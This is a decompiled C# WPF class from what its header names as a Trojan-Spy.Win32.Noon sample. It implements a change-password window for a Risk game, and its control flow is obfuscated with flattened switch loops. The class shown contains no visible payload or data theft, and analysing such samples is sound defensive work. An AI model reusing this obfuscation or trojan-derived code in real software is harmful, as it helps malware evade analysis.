// Decompiled with JetBrains decompiler
// Type: ArrayWithOff.Annotations.ProducerServerAnnotation
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Database;
using ArrayWithOff.Dictionaries;
using RiskGame;
using RiskGame.Dispatcher;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Markup;

namespace ArrayWithOff.Annotations
{
  public class ProducerServerAnnotation : Window, IComponentConnector, IStyleConnector
  {
    internal StackPanel panel_MainUI;
    internal TextBox txtName;
    internal PasswordBox txtPass;
    internal TextBox txtPassShow;
    internal Button btnPassToggle;
    internal CheckBox chkPass;
    internal PasswordBox txtNewPass;
    internal TextBox txtNewPassShow;
    internal CheckBox chkNewPass;
    internal PasswordBox txtNewPassConf;
    internal TextBox txtNewPassConfShow;
    internal CheckBox chkNewPassConf;
    internal Label lblError;
    internal TextBlock txtError;
    internal Label lblSuccess;
    internal TextBlock txtSuccess;
    private bool _Event;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ProducerServerAnnotation()
    {
      int num = 2;
      while (true)
      {
        switch (num)
        {
          case 0:
          case 2:
            ProxyParser.NewPool();
            num = 4;
            continue;
          case 1:
          case 4:
            // ISSUE: explicit constructor call
            base.\u002Ector();
            goto case 3;
          case 3:
            this.InsertExpression();
            num = 5;
            continue;
          case 5:
            goto label_6;
          default:
            if (ProducerServerAnnotation.LoginContainer())
            {
              num = 3;
              continue;
            }
            goto case 0;
        }
      }
label_6:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ProducerServerAnnotation(string def)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
              goto label_1;
            case 1:
            case 4:
              goto label_3;
            case 3:
              ProxyParser.NewPool();
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_3;
            case 5:
              goto label_7;
            default:
              goto label_6;
          }
        }
label_1:
        this.InsertExpression();
        this.txtName.Text = def;
        num1 = 5;
        continue;
label_3:
        // ISSUE: explicit constructor call
        base.\u002Ector();
        goto label_1;
label_6:
        num1 = 0;
      }
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InsertExpression()
    {
      this.InitializeComponent();
      this.DataContext = (object) this;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CollectExpression(string last)
    {
      this.txtError.Text = last;
      this.lblError.Visibility = Visibility.Visible;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ComputeExpression(string param)
    {
      this.txtSuccess.Text = param;
      this.lblSuccess.Visibility = Visibility.Visible;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ListExpression()
    {
      this.lblError.Visibility = Visibility.Collapsed;
      this.lblSuccess.Visibility = Visibility.Collapsed;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CheckExpression(object v, RoutedEventArgs ord)
    {
      int num1 = 0;
      while (true)
      {
        int num2 = num1;
        TextBox textBox;
        PasswordBox passwordBox;
        while (true)
        {
          CheckBox checkBox;
          string name;
          switch (num2)
          {
            case 0:
              checkBox = (CheckBox) v;
              if (true)
              {
                num2 = 3;
                continue;
              }
              goto case 1;
            case 1:
              textBox = this.txtPassShow;
              break;
            case 2:
            case 6:
              name = checkBox.Name;
              num2 = 9;
              continue;
            case 3:
              goto label_16;
            case 4:
              goto label_18;
            case 5:
              textBox = this.txtNewPassShow;
              break;
            case 7:
              goto label_14;
            case 8:
              goto label_22;
            case 9:
label_11:
              string str = name;
              if (!(str == "chkPass"))
              {
                if (str == "chkNewPass")
                {
                  passwordBox = this.txtNewPass;
                  goto case 5;
                }
                else
                {
                  if (str == "chkNewPassConf")
                  {
                    passwordBox = this.txtNewPassConf;
                    textBox = this.txtNewPassConfShow;
                    break;
                  }
                  break;
                }
              }
              else
              {
                passwordBox = this.txtPass;
                if (ProducerServerAnnotation.LoginContainer())
                {
                  num2 = 1;
                  continue;
                }
                goto label_16;
              }
            case 10:
              goto label_20;
            default:
              goto label_6;
          }
          bool? isChecked = checkBox.IsChecked;
          bool flag = true;
          if (isChecked.GetValueOrDefault() == flag & isChecked.HasValue)
          {
            if (ProducerServerAnnotation.LoginContainer())
              num2 = 4;
            else
              goto label_11;
          }
          else
          {
            passwordBox.Password = textBox.Text;
            passwordBox.Visibility = Visibility.Visible;
            textBox.Visibility = Visibility.Collapsed;
            num2 = 10;
          }
        }
label_6:
        num1 = 5;
        continue;
label_16:
        passwordBox = new PasswordBox();
        textBox = new TextBox();
        num1 = 6;
        continue;
label_18:
        textBox.Text = passwordBox.Password;
        passwordBox.Visibility = Visibility.Collapsed;
        textBox.Visibility = Visibility.Visible;
        num1 = 8;
      }
label_14:
      return;
label_22:
      return;
label_20:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void StartExpression(object def, KeyEventArgs visitor)
    {
      int num1 = 3;
      while (true)
      {
        bool flag;
        int num2;
        switch (num1)
        {
          case 0:
          case 3:
            flag = visitor.Key == Key.Return;
            if (true)
            {
              num1 = 4;
              continue;
            }
            goto case 2;
          case 1:
          case 4:
            if (!flag)
              goto label_2;
            else
              goto case 2;
          case 2:
            this.PatchExpression(def, (RoutedEventArgs) visitor);
            num2 = 5;
            break;
          case 5:
            goto label_8;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
      }
label_2:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void PatchExpression(object res, RoutedEventArgs counter)
    {
      try
      {
        this.ListExpression();
        if (this.txtName.Text == null || this.txtName.Text == "" || this.txtPass.Password == null || this.txtPass.Password == "" || this.txtNewPass.Password == null || this.txtNewPass.Password == "" || this.txtNewPassConf.Password == null || this.txtNewPassConf.Password == "")
          throw new ArgumentNullException();
        if (this.txtNewPass.Password == this.txtNewPassConf.Password)
        {
          Human.AssetSerializer(this.txtNewPass.Password);
          Human.FindSerializer(Human.FlushSerializer(this.txtName.Text, this.txtPass.Password), this.txtNewPass.Password);
          this.ComputeExpression("Your password has been changed.");
        }
        else
          this.CollectExpression("The password(s) do not match");
      }
      catch (ArgumentNullException ex)
      {
        this.CollectExpression("Please provide an input for every field.");
      }
      catch (IOException ex)
      {
        this.CollectExpression("An error reading or writing from the file has occurred. Please ensure you have created an account, try again, restart the application or delete the Usersaves.txt file in the game directory.");
      }
      catch (ListenerServerAnnotation ex)
      {
        this.CollectExpression(ex.expressionParser);
      }
      catch (ModelParser ex)
      {
        this.CollectExpression("Your account was not found. Please check your password.");
      }
      catch (WrapperModelDispatcher ex)
      {
        this.CollectExpression(ex.Message);
      }
      catch (Exception ex)
      {
        this.CollectExpression("An unknown error has occurred.");
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void SelectExpression(object task, TextChangedEventArgs ivk)
    {
      int num1 = 6;
      while (true)
      {
        int num2 = num1;
        PasswordBox passwordBox;
        string name;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 6:
              goto label_1;
            case 1:
            case 2:
              goto label_13;
            case 3:
            case 4:
              goto label_2;
            case 5:
              if (!(name == "txtPassShow"))
              {
                if (!(name == "txtNewPassShow"))
                {
                  if (name == "txtNewPassConfShow")
                  {
                    passwordBox = this.txtNewPassConf;
                    num2 = 3;
                    continue;
                  }
                  goto label_2;
                }
                else
                  goto label_7;
              }
              else
                goto label_6;
            case 7:
              goto label_11;
            default:
              num2 = 4;
              continue;
          }
        }
label_1:
        TextBox textBox = (TextBox) task;
        num1 = 2;
        continue;
label_2:
        passwordBox.Password = textBox.Text;
        num1 = 7;
        continue;
label_6:
        passwordBox = this.txtPass;
        goto label_2;
label_7:
        passwordBox = this.txtNewPass;
        goto label_2;
label_13:
        passwordBox = new PasswordBox();
        name = textBox.Name;
        num1 = 5;
      }
label_11:;
    }

    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_12;
            case 1:
            case 2:
              if (flag)
              {
                if (true)
                {
                  num2 = 0;
                  continue;
                }
                goto case 5;
              }
              else
              {
                this._Event = true;
                goto case 3;
              }
            case 3:
            case 4:
              Application.LoadComponent((object) this, new Uri("/ArrayWithOff;component/changepassword.xaml", UriKind.Relative));
              if (true)
              {
                num2 = 6;
                continue;
              }
              goto label_10;
            case 5:
              flag = this._Event;
              if (true)
              {
                num2 = 2;
                continue;
              }
              goto label_4;
            case 6:
              goto label_10;
            default:
              goto label_8;
          }
        }
label_8:
        num1 = 4;
      }
label_4:
      return;
label_12:
      return;
label_10:;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int var1, object cfg)
    {
      int num1 = 9;
      if (true)
        goto label_21;
label_12:
      this._Event = true;
      int num2 = 10;
label_20:
      num1 = num2;
label_21:
      int num3;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 9:
            goto label_7;
          case 1:
            goto label_12;
          case 2:
            goto label_26;
          case 3:
            goto label_27;
          case 4:
            goto label_28;
          case 5:
            switch (num3)
            {
              case 1:
                goto label_1;
              case 2:
              case 3:
              case 4:
                goto label_12;
              case 5:
                goto label_2;
              case 6:
                goto label_3;
              case 7:
                goto label_4;
              case 8:
                goto label_5;
              case 9:
                goto label_6;
              case 10:
                goto label_14;
              case 11:
                goto label_15;
              case 12:
                goto label_16;
              case 13:
                goto label_17;
              case 14:
                goto label_18;
              case 15:
                goto label_19;
              case 16:
                goto label_8;
              case 17:
                goto label_9;
              case 18:
                this.txtError = (TextBlock) cfg;
                int num4 = 4;
                num1 = ProducerServerAnnotation.PrintContainer() ? num4 : num4;
                continue;
              case 19:
                goto label_23;
              case 20:
                goto label_11;
              default:
                num1 = 1;
                continue;
            }
          case 6:
            goto label_29;
          case 7:
            goto label_30;
          case 8:
            goto label_13;
          case 10:
            goto label_31;
          default:
            goto label_22;
        }
      }
label_1:
      this.panel_MainUI = (StackPanel) cfg;
      return;
label_2:
      this.txtName = (TextBox) cfg;
      this.txtName.KeyDown += new KeyEventHandler(this.StartExpression);
      return;
label_3:
      this.txtPass = (PasswordBox) cfg;
      return;
label_4:
      this.txtPassShow = (TextBox) cfg;
      return;
label_5:
      this.btnPassToggle = (Button) cfg;
      return;
label_6:
      this.chkPass = (CheckBox) cfg;
      num2 = 8;
      goto label_20;
label_7:
      int num5 = var1;
      num2 = 2;
      goto label_20;
label_8:
      ((ButtonBase) cfg).Click += new RoutedEventHandler(this.PatchExpression);
      return;
label_9:
      this.lblError = (Label) cfg;
      return;
label_11:
      this.txtSuccess = (TextBlock) cfg;
      return;
label_13:
      this.chkPass.Click += new RoutedEventHandler(this.CheckExpression);
      return;
label_14:
      this.txtNewPass = (PasswordBox) cfg;
      return;
label_15:
      this.txtNewPassShow = (TextBox) cfg;
      return;
label_16:
      this.chkNewPass = (CheckBox) cfg;
      this.chkNewPass.Click += new RoutedEventHandler(this.CheckExpression);
      return;
label_17:
      this.txtNewPassConf = (PasswordBox) cfg;
      return;
label_18:
      this.txtNewPassConfShow = (TextBox) cfg;
      return;
label_19:
      this.chkNewPassConf = (CheckBox) cfg;
      this.chkNewPassConf.Click += new RoutedEventHandler(this.CheckExpression);
      return;
label_27:
      return;
label_29:
      return;
label_30:
      return;
label_28:
      return;
label_31:
      return;
label_22:
      num2 = 3;
      goto label_20;
label_23:
      this.lblSuccess = (Label) cfg;
      num2 = 7;
      goto label_20;
label_26:
      num3 = num5;
      num2 = 5;
      goto label_20;
    }

    [EditorBrowsable(EditorBrowsableState.Never)]
    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IStyleConnector.Connect(int param_ID, object selection)
    {
      int num1 = 8;
      EventSetter eventSetter;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            goto label_3;
          case 1:
          case 4:
label_11:
            eventSetter = new EventSetter();
            num3 = 7;
            break;
          case 2:
            goto label_14;
          case 3:
            switch (num2)
            {
              case 2:
                goto label_8;
              case 3:
                eventSetter = new EventSetter();
                eventSetter.Event = UIElement.KeyDownEvent;
                eventSetter.Handler = (Delegate) new KeyEventHandler(this.StartExpression);
                num1 = 0;
                continue;
              case 4:
                ((Style) selection).Setters.Add((SetterBase) new EventSetter()
                {
                  Event = TextBoxBase.TextChangedEvent,
                  Handler = (Delegate) new TextChangedEventHandler(this.SelectExpression)
                });
                goto label_11;
              default:
                num1 = 5;
                continue;
            }
          case 5:
            goto label_15;
          case 6:
            eventSetter.Handler = (Delegate) new KeyEventHandler(this.StartExpression);
            ((Style) selection).Setters.Add((SetterBase) eventSetter);
            num3 = 9;
            break;
          case 7:
            eventSetter.Event = UIElement.KeyDownEvent;
            num3 = 6;
            break;
          case 8:
            num2 = param_ID;
            num3 = 3;
            break;
          case 9:
            goto label_16;
          default:
            num3 = 1;
            break;
        }
        num1 = num3;
      }
label_3:
      ((Style) selection).Setters.Add((SetterBase) eventSetter);
      return;
label_14:
      return;
label_15:
      return;
label_16:
      return;
label_8:
      ((Style) selection).Setters.Add((SetterBase) new EventSetter()
      {
        Event = UIElement.KeyDownEvent,
        Handler = (Delegate) new KeyEventHandler(this.StartExpression)
      });
    }

    internal static bool LoginContainer() => true;

    internal static bool PrintContainer() => false;
  }
}
